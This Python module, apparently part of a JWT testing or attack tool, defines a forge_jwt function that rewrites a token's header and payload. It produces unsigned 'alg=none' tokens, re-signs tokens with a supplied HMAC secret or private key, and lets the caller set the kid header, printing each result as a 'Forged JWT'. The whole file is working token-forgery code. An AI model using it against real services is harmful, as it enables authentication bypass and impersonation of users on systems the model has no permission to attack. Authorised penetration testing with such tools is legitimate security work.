import base64
import json
import jwt
from . import ui, parser

def forge_jwt(alg, payload_str=None, token=None, secret=None, privkey_path=None, kid=None):
    if token:
        header, payload, _ = parser.decode_jwt(token)
        if not header or not payload:
            ui.error("Invalid token format. Could not decode.")
            return
        header["alg"] = alg
        header.setdefault("typ", "JWT")
        if kid:
            header["kid"] = kid
    else:
        if payload_str is None:
            ui.error("Payload JSON or token is required.")
            return
        try:
            payload = json.loads(payload_str)
        except json.JSONDecodeError:
            ui.error("Invalid payload format. Must be valid JSON.")
            return
        header = {"alg": alg, "typ": "JWT"}
        if kid:
            header["kid"] = kid

    if alg == "none":
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        forged_token = f"{header_b64}.{payload_b64}."
        ui.success("\n[+] Forged JWT (alg=none):")
        print(forged_token)
        return

    elif alg == "HS256":
        if not secret:
            ui.error("HS256 requires -secret to sign the token.")
            return
        token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
        ui.success("\n[+] Forged JWT (HS256):")
        print(token)
        return

    elif alg in {"RS256", "ES256", "PS256"}:
        if not privkey_path:
            ui.error("{} requires -privkey path to sign the token.".format(alg))
            return
        try:
            with open(privkey_path, "r") as f:
                private_key = f.read()
        except Exception as e:
            ui.error(f"Failed to read private key: {e}")
            return
        token = jwt.encode(payload, private_key, algorithm=alg, headers=header)
        ui.success(f"\n[+] Forged JWT ({alg}):")
        print(token)
        return

    else:
        ui.error(f"Unsupported algorithm: {alg}")
